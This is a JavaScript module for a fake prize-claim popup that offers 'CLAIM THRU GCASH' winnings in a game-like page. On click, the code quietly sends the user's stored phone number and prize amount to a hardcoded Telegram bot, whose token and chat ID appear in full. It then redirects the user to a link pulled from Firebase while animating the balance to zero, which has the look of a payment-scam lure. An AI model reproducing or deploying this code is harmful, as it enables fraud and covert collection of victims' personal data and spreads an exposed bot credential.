/**
 * Claim Popup Module - With Countdown in Main Game Area
 */

let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    redirectTimer: null
};

// Show the claim popup
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    
    claimBtn.classList.remove('processing');
    claimBtn.innerHTML = 'CLAIM THRU GCASH';
    claimBtn.disabled = false;
    
    popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

// Show pending status in main game area
function showPendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) {
        pendingArea.style.display = 'block';
    }
}

function hidePendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) {
        pendingArea.style.display = 'none';
    }
}

// Update countdown display in main game area
function updateCountdownDisplay(seconds) {
    const timerSpan = document.getElementById('pendingCountdown');
    if (!timerSpan) return;
    const secs = seconds;
    timerSpan.innerText = `00:${secs.toString().padStart(2, '0')}`;
}

// Animate balance decreasing from current to 0
function animateBalanceToZero(currentBalance, onComplete) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = currentBalance;
    const step = Math.max(1, Math.floor(currentBalance / 20));
    const interval = setInterval(() => {
        current = Math.max(0, current - step);
        balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        
        if (current <= 0) {
            clearInterval(interval);
            balanceText.innerText = "₱0.00";
            if (onComplete) onComplete();
        }
    }, 500);
}

// Start 10-second countdown and redirect
function startCountdownAndRedirect(redirectUrl, userPhone, amount) {
    let remaining = 10;
    updateCountdownDisplay(remaining);
    
    claimState.countdownInterval = setInterval(() => {
        remaining--;
        updateCountdownDisplay(remaining);
        
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            
            const finalMsg = `✅ CLAIM REDIRECTED!\n📱 ${userPhone}\n💵 ₱${amount}\n🔗 ${redirectUrl}`;
            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(finalMsg)}`)
                .catch(e => console.log('Telegram error:', e));
            
            window.location.href = redirectUrl;
        }
    }, 1000);
}

// Main claim action
function onClaimAction() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone,
                    amount: amount,
                    claimedAt: Date.now()
                });
                
                hideClaimPopup();
                showPendingStatus();
                
                animateBalanceToZero(amount, () => {
                    if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                        window.parent.updateGameBalance(0);
                    } else if (typeof updateGameBalance === 'function') {
                        updateGameBalance(0);
                    } else if (typeof GameState !== 'undefined') {
                        GameState.balance = 0;
                        if (typeof updateUI === 'function') updateUI();
                        if (typeof saveData === 'function') saveData();
                    }
                });
                
                startCountdownAndRedirect(redirectUrl, userPhone, amount);
                
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("Sorry! No available rewards at the moment. Please try again later.");
            }
        }).catch((error) => {
            console.error("Database error:", error);
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
            alert("Database error. Please try again.");
        });
    } else {
        alert("Firebase not initialized. Please refresh.");
        claimState.isProcessing = false;
        claimBtn.classList.remove('processing');
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
}

document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('claimPopup')) {
        console.log('Popup container not found');
    }
    hidePendingStatus();
});
